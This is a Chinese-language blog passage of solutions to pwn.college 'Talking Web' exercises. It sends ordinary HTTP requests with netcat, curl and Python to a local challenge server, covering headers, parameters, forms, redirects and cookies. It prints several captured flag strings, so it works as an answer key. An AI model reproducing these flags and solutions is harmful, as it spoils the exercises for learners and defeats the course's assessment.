MetaData</h4><p>查看源码，路径为<code>/fulfill</code>，F12打开开发者模式，然后在Network中，找到fulfill这一项，点击后在右边找到Header，其中X-FLAG字段就是flag</p><h4 id="5-HTTP-netcat"><a href="#5-HTTP-netcat" class="headerlink" title="5. HTTP (netcat)"></a>5. HTTP (netcat)</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hacker</span>@talking-web~http-netcat:~/Desktop$ nc challenge.localhost <span class="hljs-number">80</span><br><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span>: Werkzeug/<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span> Python/<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">10</span><br><span class="hljs-attribute">Date</span>: Sun, <span class="hljs-number">02</span> Mar <span class="hljs-number">2025</span> <span class="hljs-number">12</span>:<span class="hljs-number">59</span>:<span class="hljs-number">11</span> GMT<br><span class="hljs-attribute">Content</span>-Type: text/html; charset=utf-<span class="hljs-number">8</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">84</span><br><span class="hljs-attribute">X</span>-Flag: pwn.college&#123;YrqEpNPZzcBDnBQkJiogkaSfKN0.dljNyMDLxYTN1YzW&#125;<br><span class="hljs-attribute">Connection</span>: close<br><br><span class="hljs-section">&lt;html&gt;</span><span class="hljs-section">&lt;head&gt;</span><span class="hljs-section">&lt;title&gt;</span><span class="hljs-attribute">Talking</span> Web&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Great job!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>思路就是，使用nc命令，获取网页信息。并且使用GET请求，随后接收到响应。响应中存在flag。</p><blockquote><p>记住，输入两次回车，才是结束本次请求。</p></blockquote><h4 id="6-HTTP-Paths-netcat"><a href="#6-HTTP-Paths-netcat" class="headerlink" title="6. HTTP Paths (netcat)"></a>6. HTTP Paths (netcat)</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hacker</span>@talking-web~http-paths-netcat:~/Desktop$ nc challenge.localhost <span class="hljs-number">80</span><br><span class="hljs-attribute">GET</span> /hack HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span>: Werkzeug/<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span> Python/<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">10</span><br><span class="hljs-attribute">Date</span>: Sun, <span class="hljs-number">02</span> Mar <span class="hljs-number">2025</span> <span class="hljs-number">13</span>:<span class="hljs-number">04</span>:<span class="hljs-number">48</span> GMT<br><span class="hljs-attribute">Content</span>-Type: text/html; charset=utf-<span class="hljs-number">8</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">243</span><br><span class="hljs-attribute">Connection</span>: close<br><br><br>        <span class="hljs-section">&lt;html&gt;</span><br>          <span class="hljs-section">&lt;head&gt;</span><span class="hljs-section">&lt;title&gt;</span><span class="hljs-attribute">Talking</span> Web&lt;/title&gt;&lt;/head&gt;<br>        <span class="hljs-section">&lt;body&gt;</span><br>          <span class="hljs-section">&lt;h1&gt;</span><span class="hljs-attribute">Great</span> job!&lt;/h1&gt;<br>          <span class="hljs-section">&lt;!-- TOP SECRET: &lt;p&gt;</span><span class="hljs-attribute">pwn</span>.college&#123;s97BHDSXwCrre5GEUP0gFK5CKc_.dVzNyMDLxYTN1YzW&#125;&lt;/p&gt; --&gt;<br>        <span class="hljs-section">&lt;/body&gt;</span><br>        <span class="hljs-section">&lt;/html&gt;</span><br>    <br></code></pre></td></tr></table></figure><p>多了一个路径而已。</p><h4 id="7-HTTP-curl"><a href="#7-HTTP-curl" class="headerlink" title="7. HTTP (curl)"></a>7. HTTP (curl)</h4><p><code>curl</code>是一个强大的命令行工具，用于与服务器进行数据传输。它支持多种协议。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl [选项] [URL]<br></code></pre></td></tr></table></figure><p><strong>常用选项</strong></p><table><thead><tr><th align="left">选项</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>-X</code> 或 <code>--request</code></td><td align="left">指定 HTTP 请求方法（如 GET、POST、PUT、DELETE）。</td></tr><tr><td align="left"><code>-H</code> 或 <code>--header</code></td><td align="left">添加 HTTP 请求头。</td></tr><tr><td align="left"><code>-d</code> 或 <code>--data</code></td><td align="left">发送 POST 请求的数据（表单数据）。</td></tr><tr><td align="left"><code>-F</code> 或 <code>--form</code></td><td align="left">发送文件或表单数据（用于文件上传）。</td></tr><tr><td align="left"><code>-o</code> 或 <code>--output</code></td><td align="left">将输出保存到文件。</td></tr><tr><td align="left"><code>-O</code></td><td align="left">将输出保存为文件名（从 URL 中提取文件名）。</td></tr><tr><td align="left"><code>-i</code> 或 <code>--include</code></td><td align="left">显示响应头信息。</td></tr><tr><td align="left"><code>-I</code> 或 <code>--head</code></td><td align="left">仅显示响应头信息（HEAD 请求）。</td></tr><tr><td align="left"><code>-u</code> 或 <code>--user</code></td><td align="left">指定用户名和密码（用于认证）。</td></tr><tr><td align="left"><code>-v</code> 或 <code>--verbose</code></td><td align="left">显示详细请求和响应信息。</td></tr><tr><td align="left"><code>-L</code> 或 <code>--location</code></td><td align="left">自动跟随重定向。</td></tr><tr><td align="left"><code>-k</code> 或 <code>--insecure</code></td><td align="left">忽略 SSL 证书验证。</td></tr><tr><td align="left"><code>-s</code> 或 <code>--silent</code></td><td align="left">静默模式，不显示进度和错误信息。</td></tr><tr><td align="left"><code>-A</code> 或 <code>--user-agent</code></td><td align="left">设置 User-Agent 请求头。</td></tr></tbody></table><p>这题很简单了，直接curl就好了。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">hacker@talking-web~http-curl:~/Desktop$ curl challenge</span><br><span class="language-xml">.localhost/pwn</span><br><span class="language-xml"></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Talking Web<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Great job!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>pwn.college</span><span class="hljs-template-variable">&#123;UNlBBwS-NwpLJYdlVPpEoojvICd.dRzNyMDLxYTN1YzW&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="8-HTTP-python"><a href="#8-HTTP-python" class="headerlink" title="8. HTTP (python)"></a>8. HTTP (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.localhost/verify&quot;</span><br><br>response = requests.get(url)<br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br><br></code></pre></td></tr></table></figure><p>用python的requests模块，写个get请求即可。</p><h4 id="9-HTTP-Host-Header-python"><a href="#9-HTTP-Host-Header-python" class="headerlink" title="9. HTTP Host Header (python)"></a>9. HTTP Host Header (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.localhost/submission&quot;</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;ctflearn.com:80&quot;</span><br>&#125;<br>response = requests.get(url, headers=headers)<br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br><br></code></pre></td></tr></table></figure><h4 id="10-HTTP-Host-Header-curl"><a href="#10-HTTP-Host-Header-curl" class="headerlink" title="10. HTTP Host Header (curl)"></a>10. HTTP Host Header (curl)</h4><p>查一查curl的用法即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -H <span class="hljs-string">&quot;Host: overthewire.org:80&quot;</span> challenge.localhost/progress<br></code></pre></td></tr></table></figure><h4 id="11-HTTP-Host-Header-netcat"><a href="#11-HTTP-Host-Header-netcat" class="headerlink" title="11. HTTP Host Header (netcat)"></a>11. HTTP Host Header (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~http-host-header-netcat:~/Desktop$ nc -v challenge.localhost  80<br>Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!<br>GET /hack HTTP/1.1<br>Host: gandalf.lakera.ai:80<br><br>HTTP/1.1 200 OK<br>Server: Werkzeug/3.0.6 Python/3.8.10<br>Date: Sun, 02 Mar 2025 13:36:13 GMT<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 222<br>Connection: close<br><br><br>        &lt;html&gt;<br>          &lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;Talking Web&lt;/title&gt;&lt;/head&gt;<br>        &lt;body&gt;<br>          &lt;h1&gt;Great job!&lt;/h1&gt;<br>          &lt;p&gt;pwn.college&#123;IpeiHFr8AbndI-uKFGS8WxMBKHR.dJzNyMDLxYTN1YzW&#125;&lt;/p&gt;<br>        &lt;/body&gt;<br>        &lt;/html&gt;<br></code></pre></td></tr></table></figure><h4 id="12-URL-Encoding-netcat"><a href="#12-URL-Encoding-netcat" class="headerlink" title="12. URL Encoding (netcat)"></a>12. URL Encoding (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~url-encoding-netcat:~/Desktop$ nc -v challenge.localhost 80<br>Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!<br>GET /entry%20mission%20verify HTTP/1.1<br>Host: challenge.localhost:80<br><br>HTTP/1.1 200 OK<br>Server: Werkzeug/3.0.6 Python/3.8.10<br>Date: Sun, 02 Mar 2025 13:42:45 GMT<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 222<br>Connection: close<br><br><br>        &lt;html&gt;<br>          &lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;Talking Web&lt;/title&gt;&lt;/head&gt;<br>        &lt;body&gt;<br>          &lt;h1&gt;Great job!&lt;/h1&gt;<br>          &lt;p&gt;pwn.college&#123;gJwS5WKPnVX7YX3P2lEwKq0xpc3.dlzNyMDLxYTN1YzW&#125;&lt;/p&gt;<br>        &lt;/body&gt;<br>        &lt;/html&gt;<br></code></pre></td></tr></table></figure><p>编码，空格在url编码中是<code>%20</code>，因此，在nc命令中使用<code>%20</code>代替即可。</p><h4 id="13-HTTP-GET-Parameters"><a href="#13-HTTP-GET-Parameters" class="headerlink" title="13. HTTP GET Parameters"></a>13. HTTP GET Parameters</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.localhost/submit&quot;</span><br>params = &#123;<br>    <span class="hljs-string">&quot;unlock&quot;</span>: <span class="hljs-string">&quot;ufxxiiik&quot;</span><br>&#125;<br>headers = &#123;<br>    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;challenge.localhost:80&quot;</span><br>&#125;<br>response = requests.get(url, headers=headers, params=params)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br><br></code></pre></td></tr></table></figure><p>加GET请求的参数。</p><h4 id="14-Multiple-HTTP-parameters-netcat"><a href="#14-Multiple-HTTP-parameters-netcat" class="headerlink" title="14. Multiple HTTP parameters (netcat)"></a>14. Multiple HTTP parameters (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~multiple-http-parameters-netcat:~/Desktop$ nc -v challenge.localhost 80<br>Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!<br>GET /pass?security=kifydwjj&amp;auth_key=mbdncplm&amp;keycode=zuqfwurr HTTP/1.1<br>Host: challenge.localhost:80<br></code></pre></td></tr></table></figure><p>用nc命令，构造一个GET请求即可。</p><h4 id="15-Multiple-HTTP-parameters-curl"><a href="#15-Multiple-HTTP-parameters-curl" class="headerlink" title="15. Multiple HTTP parameters(curl)"></a>15. Multiple HTTP parameters(curl)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~multiple-http-parameters-curl:~/Desktop$ curl -H <span class="hljs-string">&quot;Host: challenge.localhost:80&quot;</span>  <span class="hljs-string">&quot;http://challenge.localhost/authenticate?hash=jzsfndeg&amp;auth_pass=erdsycur&amp;access_code=sxobnyrn&quot;</span><br></code></pre></td></tr></table></figure><p>用双引号包括域名，使得<code>&amp;</code>被用作参数连接符。</p><h4 id="16-HTTP-Forms"><a href="#16-HTTP-Forms" class="headerlink" title="16. HTTP Forms"></a>16. HTTP Forms</h4><p>这关本来是直接打开浏览器访问提交表单就能拿到flag，但是那个太卡了，所以这里也用的python来发送Post请求。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.localhost/request&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;verify&quot;</span>: <span class="hljs-string">&quot;mbobcxum&quot;</span><br>&#125;<br>headers = &#123;<br>    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;challenge.localhost:80&quot;</span>,<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Firefox&quot;</span><br>&#125;<br><br>response = requests.post(url, headers=headers, data=data)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p>这里需要加<code>User-Agent</code>字段，是因为题目会检测是否采用的是Firefox打开。</p><h4 id="17-HTTP-Forms-curl"><a href="#17-HTTP-Forms-curl" class="headerlink" title="17. HTTP Forms (curl)"></a>17. HTTP Forms (curl)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~http-forms-curl:~/Desktop$ curl -X POST -d <span class="hljs-string">&quot;keycode=xqwrvyfd&quot;</span> -H <span class="hljs-string">&quot;Host: challenge.localhost:80&quot;</span> http://challenge.localhost/meet<br></code></pre></td></tr></table></figure><h4 id="18-HTTP-Forms-netcat"><a href="#18-HTTP-Forms-netcat" class="headerlink" title="18. HTTP Forms (netcat)"></a>18. HTTP Forms (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~http-forms-netcat:~/Desktop$ nc -v challenge.localhost 80<br>Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!<br>POST /check HTTP/1.1<br>Host: challenge.localhost:80<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 22<br><br>private%5Fkey=bxildsjt<br>HTTP/1.1 200 OK<br></code></pre></td></tr></table></figure><p>这里有一个很坑的点，必须得有<code>Content-Length</code>字段，且有这个字段后，就可以回车再回车。此时接收表单数据。再进行url编码。</p><h4 id="19-HTTP-Forms-python"><a href="#19-HTTP-Forms-python" class="headerlink" title="19. HTTP Forms (python)"></a>19. HTTP Forms (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.localhost/progress&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;cboboidk&quot;</span><br>&#125;<br>headers = &#123;<br>    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;challenge.localhost:80&quot;</span>,<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Firefox/2.0.0.11&quot;</span><br>&#125;<br><br>response = requests.post(url, headers=headers, data=data)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><h4 id="20-HTTP-Forms-Without-Forms"><a href="#20-HTTP-Forms-Without-Forms" class="headerlink" title="20. HTTP Forms Without Forms"></a>20. HTTP Forms Without Forms</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.localhost/verify&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;auth_key&quot;</span>: <span class="hljs-string">&quot;hhyrdgcr&quot;</span><br>&#125;<br>headers = &#123;<br>    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;challenge.localhost:80&quot;</span>,<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Firefox/2.0.0.11&quot;</span><br>&#125;<br><br>response = requests.post(url, headers=headers, data=data)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><h4 id="21-Multiple-Form-Fields-curl"><a href="#21-Multiple-Form-Fields-curl" class="headerlink" title="21. Multiple Form Fields (curl)"></a>21. Multiple Form Fields (curl)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~multiple-form-fields-curl:~/Desktop$ curl -X POST -d <span class="hljs-string">&quot;private_key=iqzryxmm&amp;secret_key=ufaeulmp&amp;secure_key=fgynzsij&quot;</span> -H <span class="hljs-string">&quot;Host: challenge.localhost:80&quot;</span> http://challenge.localhost/qualify<br></code></pre></td></tr></table></figure><h4 id="22-Multiple-Form-Fields-netcat"><a href="#22-Multiple-Form-Fields-netcat" class="headerlink" title="22. Multiple Form Fields (netcat)"></a>22. Multiple Form Fields (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~multiple-form-fields-netcat:~/Desktop$ nc -v challenge.localhost 80<br>Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!<br>POST /submission HTTP/1.1<br>Host: challenge.localhost:80<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 70<br><br>authcode=gzevumwe&amp;password=zcfrbrpt&amp;verify=wpbxshiv&amp;signature=ktkceqld<br></code></pre></td></tr></table></figure><p>同理，参数也用<code>&amp;</code>连接即可。</p><h4 id="23-HTTP-Redirects-netcat"><a href="#23-HTTP-Redirects-netcat" class="headerlink" title="23. HTTP Redirects (netcat)"></a>23. HTTP Redirects (netcat)</h4><p>重定向，首先先发送正常的请求。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~http-redirects-netcat:~/Desktop$ nc -v challenge.localhost 80<br>Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!<br>GET / HTTP/1.1<br>Host: challenge.localhost:80<br></code></pre></td></tr></table></figure><p>发现返回数据中，有重定向的paths，那么再用nc发送这个paths的请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~http-redirects-netcat:~/Desktop$ nc -v challenge.localhost 80<br>Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!<br>GET /eFsriunp-hack HTTP/1.1             <br>Host: challenge.localhost:80<br></code></pre></td></tr></table></figure><h4 id="24-HTTP-Redirects-curl"><a href="#24-HTTP-Redirects-curl" class="headerlink" title="24. HTTP Redirects (curl)"></a>24. HTTP Redirects (curl)</h4><p>同理，用curl两次即可。</p><h4 id="25-HTTP-Redirects-python"><a href="#25-HTTP-Redirects-python" class="headerlink" title="25. HTTP Redirects (python)"></a>25. HTTP Redirects (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.localhost&quot;</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;challenge.localhost:80&quot;</span><br>&#125;<br>response = requests.get(url, headers=headers)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p>python的requests模块能够自动跟踪重定向的网页，因此发送简单的GET请求即可。</p><h4 id="26-HTTP-Cookies-curl"><a href="#26-HTTP-Cookies-curl" class="headerlink" title="26. HTTP Cookies (curl)"></a>26. HTTP Cookies (curl)</h4><blockquote><p>Make an HTTP request to 127.0.0.1 on port 80 to get the flag. Make any HTTP request, and the server will ask you to set a cookie. Make another request with that cookie to get the flag.</p></blockquote><p>提示得很清楚了，先随便发送一个请求，然后设置cookie，随后发送另一个请求拿到flag。</p><p>可以使用<code>curl -L -v challenge.localhost</code>来自动跟踪重定向</p><p>第一次是为了拿到cookie，命令为<code>curl -L -v 127.0.0.1:80</code>，随后再curl一次，用<code>-b</code>参数携带cookie。然后就能获得flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~http-cookies-curl:~/Desktop$ curl -L -v -b <span class="hljs-string">&quot;cookie=3bfab8c85fbf73872c0b0a6956fc4620&quot;</span> 127.0.0.1:80<br></code></pre></td></tr></table></figure><h4 id="27-HTTP-Cookies-netcat"><a href="#27-HTTP-Cookies-netcat" class="headerlink" title="27. HTTP Cookies (netcat)"></a>27. HTTP Cookies (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~http-cookies-netcat:~/Desktop$ nc -v 127.0.01 80<br>Connection to 127.0.01 80 port [tcp/http] succeeded!<br>GET / HTTP/1.1<br>Cookie: cookie=38c5a3fa82c7a07c9acd13244c494a59 <br></code></pre></td></tr></table></figure><h4 id="28-HTTP-Cookies-python"><a href="#28-HTTP-Cookies-python" class="headerlink" title="28. HTTP Cookies (python)"></a>28. HTTP Cookies (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br><br>response = requests.get(url)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><h4 id="29-Server-State-python"><a href="#29-Server-State-python" class="headerlink" title="29. Server State (python)"></a>29. Server State (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br><br>response = requests.get(url)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20250303120441856.png" class="" title="image-20250303120441856"><p>得益于，requests模块的get请求会自动跟踪重定向，因此执行一次脚本发现302重定向，会自动跟踪。则自动发送了4个请求，达到题目要求，获得flag。</p><h4 